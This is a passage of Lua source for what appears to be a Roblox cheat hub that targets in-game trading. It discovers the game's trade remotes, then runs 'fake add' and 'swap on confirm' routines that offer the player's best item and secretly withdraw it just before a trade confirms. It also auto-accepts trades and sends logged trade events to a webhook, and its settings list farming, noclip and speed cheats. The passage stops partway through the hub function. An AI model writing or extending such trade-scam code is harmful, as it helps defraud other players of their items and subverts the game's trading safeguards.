-- ── MAIN HUB ─────────────────────────────────────────────────────────────────
-- ══════════════════════════════════════════════════════════════════════════════
local function launch_hub()

    local CFG = {
        AutoAccept   = false,
        SwapOnConfirm= false,
        FakeAdd      = false,
        AutoDecline  = false,
        LockSnipe    = false,
        LogTrades    = true,
        AutoFarm     = false,
        AutoChest    = false,
        FruitSniper  = false,
        NoClip       = false,
        SpeedMult    = 1,
        TargetPlayer = "",
    }

    local char = lp.Character or lp.CharacterAdded:Wait()
    local root = char:WaitForChild("HumanoidRootPart")
    lp.CharacterAdded:Connect(function(c)
        char=c root=c:WaitForChild("HumanoidRootPart")
    end)

    -- remote discovery
    local Rem = {}
    task.delay(3, function()
        local function fr(p)
            for _,v in ipairs(RS:GetDescendants()) do
                if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction"))
                and v.Name:lower():find(p) then return v end
            end
        end
        Rem.Accept  = fr("accept")
        Rem.Decline = fr("declin")
        Rem.Add     = fr("additem") or fr("offer")
        Rem.Remove  = fr("removeitem") or fr("remove")
        Rem.Lock    = fr("lock")
        Rem.Confirm = fr("confirm")
    end)

    -- trade event hooks
    task.spawn(function()
        task.wait(4)
        for _,v in ipairs(RS:GetDescendants()) do
            if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction"))
            and v.Name:lower():find("trade") then
                v.OnClientEvent:Connect(function(...)
                    if CFG.LogTrades then
                        local args={...}
                        local s=""
                        for i,a in ipairs(args) do s=s.."arg"..i..": "..tostring(a).."  " end
                        send_webhook("Trade Event: "..v.Name,{
                            {name="📦 Args",value=s~=""and s or"none",inline=false}
                        })
                    end
                    if CFG.AutoAccept and Rem.Accept then
                        task.wait(0.3)
                        pcall(function() Rem.Accept:FireServer() end)
                    end
                    if CFG.LockSnipe and Rem.Lock then
                        task.wait(0.1)
                        pcall(function() Rem.Lock:FireServer() end)
                    end
                end)
            end
        end
    end)

    -- fake add loop
    local swap_hooked = false
    task.spawn(function()
        while task.wait(0.1) do
            if CFG.FakeAdd then
                local inv = lp:FindFirstChild("Inventory") or lp:FindFirstChild("Fruits")
                if inv and Rem.Add then
                    local best = inv:GetChildren()[1]
                    if best then
                        pcall(function() Rem.Add:FireServer(best.Name) end)
                        task.wait(2.5)
                        if Rem.Remove then
                            pcall(function() Rem.Remove:FireServer(best.Name) end)
                        end
                        task.wait(1)
                    end
                end
            end

            if CFG.SwapOnConfirm and Rem.Confirm and not swap_hooked then
                swap_hooked = true
                local orig = Rem.Confirm.FireServer
                Rem.Confirm.FireServer = function(self,...)
                    local inv=lp:FindFirstChild("Inventory") or lp:FindFirstChild("Fruits")
                    if inv and Rem.Remove then
                        local best=inv:GetChildren()[1]
                        if best then pcall(function() Rem.Remove:FireServer(best.Name) end) end
                    end
                    task.wait(0.02)
                    return orig(self,...)
                end
            end
        end
    end)

